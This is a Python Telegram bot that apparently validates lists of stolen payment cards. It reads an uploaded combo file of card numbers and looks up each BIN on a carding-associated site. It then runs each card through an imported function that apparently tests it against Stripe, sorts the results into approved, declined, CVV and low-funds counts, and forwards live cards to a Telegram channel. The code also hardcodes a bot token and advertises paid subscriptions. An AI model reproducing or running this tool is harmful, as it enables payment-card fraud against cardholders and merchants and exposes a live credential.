import requests
import telebot
import time
from telebot import types
from gatet import Tele
import os

CHANNEL_ID = -1003645329000
token = '8567829043:AAEZSRZEWmwoBCfCIHqBPxzMXw-ji7y_rak'
bot = telebot.TeleBot(token, parse_mode="HTML")


@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) != '7078867529':
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Mydev1")
        return
    bot.reply_to(message, "Send the file now")


@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) != '7078867529':
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Mydev1")
        return

    dd = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0

    ko = bot.reply_to(message, "⌛ <b>🔍 CARD CHECKER INITIALIZING...</b>").message_id

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    with open("combo.txt", "wb") as w:
        w.write(downloaded_file)

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()

        for cc in lino:

            if os.path.exists("stop.stop"):
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=ko,
                    text='🛑 STOP ✅\nBOT BY ➜ @buik100'
                )
                os.remove("stop.stop")
                return

            cc = cc.strip()

            try:
                data = requests.get(
                    'https://bins.antipublic.cc/bins/' + cc[:6],
                    timeout=10
                ).json()
            except:
                data = {}

            brand = data.get('brand', 'Unknown')
            card_type = data.get('type', 'Unknown')
            country = data.get('country_name', 'Unknown')
            country_flag = data.get('country_flag', '')
            bank = data.get('bank', 'Unknown')

            start_time = time.time()

            try:
                last = str(Tele(cc))
            except Exception as e:
                print(e)
                last = "error"

            execution_time = time.time() - start_time
            last_lower = last.lower()

            UI_PROCESSING = f"""
<b>🔍 CARD CHECKER</b>
━━━━━━━━━━━━━━
💳 <code>{cc}</code>

📌 <b>Status</b> ➜ {last}

📊 <b>LIVE STATS</b>
━━━━━━━━━━━━━━
✅ Approved      : <b>{ch}</b>
❌ Declined     : <b>{dd}</b>
⚠️ CVV         : <b>{cvv}</b>
🧾 CCN         : <b>{ccn}</b>
💰 Low Funds    : <b>{lowfund}</b>
━━━━━━━━━━━━━━
⏱ Time         : {execution_time:.1f}s
👑 BOT BY      ➜ @buik100
"""

            mes = types.InlineKeyboardMarkup()
            stop_btn = types.InlineKeyboardButton("🛑 STOP", callback_data="stop")
            mes.add(stop_btn)

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text=UI_PROCESSING,
                reply_markup=mes
            )

            msg = f"""
<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱</b> — <b>Stripe Auth</b> ✅
━━━━━━━━━━━━━━
💳 <code>{cc}</code>
━━━━━━━━━━━━━━
🏷 <b>{brand}</b> · {cc[:6]}
🏦 {bank}
🌍 {country} {country_flag}

⏱ <i>Time:</i> {execution_time:.1f}s
━━━━━━━━━━━━━━
by @Mydev1
"""

            print(last)

            if 'succeeded' in last_lower or 'payment successful' in last_lower:
                ch += 1
                bot.send_message(CHANNEL_ID, msg)

            elif 'your card was declined' in last_lower:
                dd += 1

            elif 'you cannot add a new payment method so soon after the previous one' in last_lower:
                dd += 1
                time.sleep(15)

            elif 'does not support this type of purchase' in last_lower:
                cvv += 1

            elif 'security code is incorrect' in last_lower or 'security code is invalid' in last_lower:
                ccn += 1

            elif 'insufficient funds' in last_lower:
                lowfund += 1

            elif 'additional action before completion' in last_lower:
                cvv += 1

            else:
                dd += 1
                time.sleep(3)

    except Exception as e:
        print(e)

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=ko,
        text='✅ CHECKED\nBOT BY ➜ @buik100'
    )


@bot.callback_query_handler(func=lambda call: call.data == "stop")
def stop_callback(call):
    with open("stop.stop", "w") as f:
        f.write("stop")


if __name__ == "__main__":
    bot.infinity_polling(timeout=10, long_polling_timeout=5)